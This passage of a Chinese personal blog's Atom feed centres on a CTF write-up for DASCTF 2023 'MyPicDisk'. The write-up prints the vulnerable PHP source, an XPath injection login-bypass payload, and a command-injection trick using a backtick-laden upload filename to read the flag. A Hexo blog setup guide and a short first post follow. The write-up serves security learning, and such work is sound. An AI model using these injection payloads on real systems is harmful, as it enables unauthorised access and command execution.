的简化版，没有不死马这种一次打中每次都能拿分的骚操作，更加考验大家写脚本的速度和熟练度。</p><p>比赛有点水，主要靠dawd攻防拉分，因为我们队第三轮就开始拿分，等别的队伍开始拿分的时候就已经甩开好多分数了。</p><p>应急响应最后只差3道题没答上来，我没做几道题，主要靠队友c，队友tql。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：&lt;/p&gt;
&lt;p&gt;① DAWD攻防赛会提供4个攻防题目环境，</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="技术" scheme="https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="rce" scheme="https://blog.lazyforever.top/tags/rce/"/>
    
    <category term="php" scheme="https://blog.lazyforever.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</title>
    <link href="https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/"/>
    <id>https://blog.lazyforever.top/2023/07/27/2023dasctf_MyPicDisk/</id>
    <published>2023-07-27T14:30:16.000Z</published>
    <updated>2023-07-27T15:42:28.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>开启容器，发现以下表单，表单信息通过post方法传送</p><img src="/2023/07/27/2023dasctf_MyPicDisk/1.png" class=""><p>通过xpath万能注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=&#x27;]|//*|//*[&#x27;&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p>注入成功，burp观察返回包发现注释信息获得提示下载源码&#x2F;y0u_cant_find_1t.zip</p><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span> . <span class="variable language_">$this</span>-&gt;filename . <span class="string">&quot;  Last Modified Time: &quot;</span> . <span class="variable language_">$this</span>-&gt;lasttime . <span class="string">&quot;  Filesize: &quot;</span> . <span class="variable language_">$this</span>-&gt;size . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span> . <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">    <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">      <span class="variable">$x_query</span> = <span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>分析源码，发现有文件上传白名单（jpg|jpeg|gif|png|bmp后缀名）</p><p>继续分析，发现class FILE的<code>system(&quot;ls -all &quot; . $this-&gt;filename);</code>处存在命令拼接</p><p>但是有条件，必须保证文件名有且只有一个<code>.</code>，并且不能含有<code>\/</code></p><p>接下来想方法绕过</p><p>首先上传文件1111.jpg，文件内容为<code>ls /</code>用来查看根目录flag文件名</p><p>接下来上传名为<code>;`cat 111*`;1.jpg</code>的文件再进行<code>?filename=;`cat 111*`;1.jpg&amp;todo=show</code>，发现成功执行了命令，返回得到flag路径<code>adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code></p><p>最后更换文件内容为<code>cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code>，再次执行命令得到flag</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h3><p>题目中xpath查询语句拼接后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;]</span><br></pre></td></tr></table></figure><p>其实后面不重要，因为admin的引号已经将查询语句闭合了</p><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;]</span><br></pre></td></tr></table></figure><p>于是相当于查询是否有admin账户，得到结果</p><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p><code>;</code>可以分隔一串命令</p><p><code>`</code>Linux中反引号的作用是在将反引号内的命令处理完毕之后，会将返回的信息传给反引号的位置，再次执行命令</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了网上好多wp，发现我的做法貌似是非预期</p><p>预期解是md5_file函数结合phar打的</p><p>太菜了太菜了，别的题目为什么不写wp，因为都不会。。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;过程&quot;&gt;&lt;a href=&quot;#过程&quot; class=&quot;headerlink&quot; title=&quot;过程&quot;&gt;&lt;/a&gt;过程&lt;/h2&gt;&lt;p&gt;开启容器，发现以下表单，表单信息通过post方法传送&lt;/p&gt;
&lt;img src=&quot;/2023/07/27/2023dasctf_MyPicD</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="技术" scheme="https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="xpath注入" scheme="https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
    <category term="rce" scheme="https://blog.lazyforever.top/tags/rce/"/>
    
    <category term="php" scheme="https://blog.lazyforever.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>使用hexo框架搭建github静态博客</title>
    <link href="https://blog.lazyforever.top/2023/06/30/hexo/"/>
    <id>https://blog.lazyforever.top/2023/06/30/hexo/</id>
    <published>2023-06-30T07:26:57.000Z</published>
    <updated>2023-06-30T08:41:41.280Z</updated>
    
    <content type="html"><![CDATA[<p>第一次使用 hexo 搭建静态网站，踩了好多坑，立此贴记录一下</p><h2 id="本地配置Hexo"><a href="#本地配置Hexo" class="headerlink" title="本地配置Hexo"></a>本地配置Hexo</h2><h3 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h3><p><a href="https://nodejs.org/zh-cn">Nodejs官方地址</a></p><p>从以上链接下载 nodejs 安装（官网下载稍慢，建议翻墙）</p><h3 id="设置npm淘宝镜像站"><a href="#设置npm淘宝镜像站" class="headerlink" title="设置npm淘宝镜像站"></a>设置npm淘宝镜像站</h3><p>npm 默认的源的下载速度可能很慢，建议使用淘宝镜像替换。执行下面的命令，将 npm 的源设置成淘宝镜像站。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p><a href="https://git-scm.com/downloads/">git官方链接</a></p><p>从以上链接下载 git 安装</p><p>一路确认，安装时要勾选 <strong>Add to PATH</strong> 选项</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>cmd 输入以下命令观察是否执行正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><h3 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h3><p>执行以下命令安装 hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli g</span><br></pre></td></tr></table></figure><p>在电脑的某个磁盘或路径新建一个文件夹(名字可以随便取)，比如我的是 D:\blog，由于这个文件夹将来就作为您存放博客的地方，所以最好不要随便放</p><p>在 D:\blog 文件夹下右键打开 Git Bash Here，输入命令: <code>hexo init</code> 进行初始化</p><p>hexo 会自动下载一些文件到这个目录</p><p>接着在 cmd 中安装其他 hexo 插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-admin --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><p>至此，本地 hexo 配置完毕。</p><p>现在可以使用 hexo 搭建本地服务器来使用</p><p>使用 <code>hexo g</code> 生成静态页面，使用 <code>hexo s</code> 开启本地服务器，接下来可以用浏览器地址栏输入 <code>localhost:4000</code> 来看见刚刚创建的博客</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><h3 id="配置-Github"><a href="#配置-Github" class="headerlink" title="配置 Github"></a>配置 Github</h3><p>注册 github 账号，并在主页创建仓库，名字为 [yourname].github.io</p><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>打开git bash终端设置 user.name 和 user.email</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密匙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>将公匙添加到 github 上</p><h3 id="将hexo博客部署到github上"><a href="#将hexo博客部署到github上" class="headerlink" title="将hexo博客部署到github上"></a>将hexo博客部署到github上</h3><p>修改配置文件 <strong>blog&#x2F;_config.yml</strong>，修改deploy项的内容，如下所示：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1.png" class=""><p>注意：</p><ul><li>分支（branch）要与自己创建仓库的分支名称一致（注意master与main的区别）</li><li>冒号后面必须添加一个空格</li><li>保持缩进格式一致</li></ul><p>给出示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">https://github.com/lazy-forever/lazy-forever.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span> </span><br></pre></td></tr></table></figure><h3 id="部署hexo"><a href="#部署hexo" class="headerlink" title="部署hexo"></a>部署hexo</h3><p>输入下面的命令将hexo博客部署到github中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl  #清理之前生成的文件</span><br><span class="line">hexo g   #生成静态页面</span><br><span class="line">hexo d   #部署</span><br></pre></td></tr></table></figure><p>隔一段时间后打开浏览器，输入 [yourname].github.io 即可看到我们部署的博客</p><h2 id="关于翻墙"><a href="#关于翻墙" class="headerlink" title="关于翻墙"></a>关于翻墙</h2><p>众所周知，中国大陆境内对于 github 的访问一直处于时常能连上时常连不上的状态，因此如果我们在执行 <code>hexo d</code> 命令时翻墙，会让部署的过程更加丝滑。</p><p>我的电脑一直在使用 clash 进行翻墙，而在 cmd 中使用<code>hexo d</code>时，clash 必须用以管理员身份打开并开启增强功能，如图：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次使用 hexo 搭建静态网站，踩了好多坑，立此贴记录一下&lt;/p&gt;
&lt;h2 id=&quot;本地配置Hexo&quot;&gt;&lt;a href=&quot;#本地配置Hexo&quot; class=&quot;headerlink&quot; title=&quot;本地配置Hexo&quot;&gt;&lt;/a&gt;本地配置Hexo&lt;/h2&gt;&lt;h3 id=&quot;安装</summary>
      
    
    
    
    <category term="博客" scheme="https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="技术" scheme="https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>My First Blog</title>
    <link href="https://blog.lazyforever.top/2023/05/29/hello-world/"/>
    <id>https://blog.lazyforever.top/2023/05/29/hello-world/</id>
    <published>2023-05-29T10:00:00.000Z</published>
    <updated>2023-05-31T15:54:21.269Z</updated>
    
    <content type="html"><![CDATA[<p>这是我的第一篇博客。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是我的第一篇博客。&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="其他" scheme="https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
</feed>
